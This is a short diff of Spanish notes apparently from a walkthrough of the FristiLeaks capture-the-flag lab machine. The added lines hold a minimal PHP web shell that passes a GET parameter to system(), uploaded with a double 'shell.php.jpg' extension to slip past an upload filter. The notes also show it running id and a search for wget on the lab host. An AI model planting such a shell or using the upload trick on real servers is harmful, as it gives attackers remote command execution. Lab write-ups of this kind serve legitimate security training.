@@ -32,7 +32,18 @@ Ninguna devuelve nada
 
 /fristi/upload.php
 /fristi/uploads/cat.png
+
 /fristi/uploads/shell.php.jpg
+  <?php
+  if($_GET['cmd']) {
+          system($_GET['cmd']);
+  }
+   ?>
 
+/fristi/uploads/shell.php.jpg?cmd=ls
 
-
+/fristi/uploads/shell.php.jpg?cmd=id
+  uid=48(apache) gid=48(apache) groups=48(apache)
+  
+http://192.168.111.135/fristi/uploads/shell.php.jpg?cmd=find%20/%20-name%20wget
+  /usr/bin/wget
